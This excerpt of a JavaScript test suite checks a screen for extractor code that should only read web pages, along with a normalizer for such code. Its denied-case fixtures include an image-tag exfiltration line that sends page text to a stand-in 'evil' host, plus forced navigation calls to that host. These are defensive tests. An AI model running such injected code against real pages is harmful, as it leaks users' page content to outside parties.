...
const { screenExtractorSource, normalizeExtractorSource } = await import(B + 'lib/extractor-screen.js');
...
export default function run(t) {
  ...
  // ── normalizeExtractorSource must never corrupt a valid body ──
  const norm = (src) => normalizeExtractorSource(src);
  t('bare body ending in object literal survives', norm('return { a: 1, b: 2 }') === 'return { a: 1, b: 2 }');
  t('bare body ending in single-line object survives', norm('return { a: 1 }') === 'return { a: 1 }');
  t('bare body ending in arrow block survives', norm('return [{ T: document.title }]') === 'return [{ T: document.title }]');
  t('function wrapper is unwrapped cleanly', norm('function() { return { a: 1 } }') === 'return { a: 1 }');
  t('named function wrapper is unwrapped', norm('function extract() { return 1 }') === 'return 1');
  t('async function wrapper is unwrapped', norm('async function() { return 1 }') === 'return 1');
  t('arrow wrapper is unwrapped cleanly', norm('() => { return { a: 1 } }') === 'return { a: 1 }');
  t('markdown fence is stripped', norm('```js\nreturn { a: 1 }\n```') === 'return { a: 1 }');
  t('fenced function wrapper is unwrapped', norm('```javascript\nfunction() { return { a: 1 } }\n```') === 'return { a: 1 }');
  t('bare body that ends in brace survives the screen', ok(norm('return { a: 1 }')));
  t('bare body with object literal passes the full screen', ok('return { a: 1 }'));
  t('bare body ending in array of objects passes the screen', ok('return [{ T: document.title }]'));
  ...
  // ── DOM-insertion exfiltration: the screen's stated purpose is "reads only" ──
  t('createElement denied', denied('var s = document.createElement("script"); return [];'));
  t('createElement img .src exfil denied', denied('var s = document.createElement("img"); s.src = "https://evil/?d=" + document.body.innerText; document.body.appendChild(s); return [];'));
  t('appendChild denied', denied('document.body.appendChild(x); return [];'));
  t('innerHTML assignment denied', denied('document.body.innerHTML = "<img src=x>"; return [];'));
  t('insertAdjacentHTML denied', denied('document.body.insertAdjacentHTML("beforeend", "<img src=x>"); return [];'));
  t('textContent assignment denied', denied('document.body.textContent = "x"; return [];'));
  t('textContent READ passes', ok('return [{T: document.body.textContent}];'));

  // ── navigation via the CALL form (previously unguarded) ──
  t('location.replace call denied', denied('location.replace("https://evil"); return [];'));
  t('location.assign call denied', denied('location.assign("https://evil"); return [];'));
  t('document.location assignment denied', denied('document.location = "https://evil"; return [];'));
  t('bare location assignment denied', denied('location = "https://evil"; return [];'));
  t('history.back denied', denied('history.back(); return [];'));
  t('history.replaceState denied', denied('history.replaceState({}, "", "/x"); return [];'));
  t('bare open() denied', denied('open("https://evil"); return [];'));
  t('requestSubmit denied', denied('document.querySelector("form").requestSubmit(); return [];'));
  t('queueMicrotask denied', denied('queueMicrotask(function(){}); return [];'));

  // ── legitimate extractors still pass ──
  t('querySelectorAll + textContent read passes', ok('return document.querySelectorAll("x").length;'));
  t('createElement named as a data field does not trip', ok('return [{T: el.getAttribute("data-createelement") || "n"}];'));
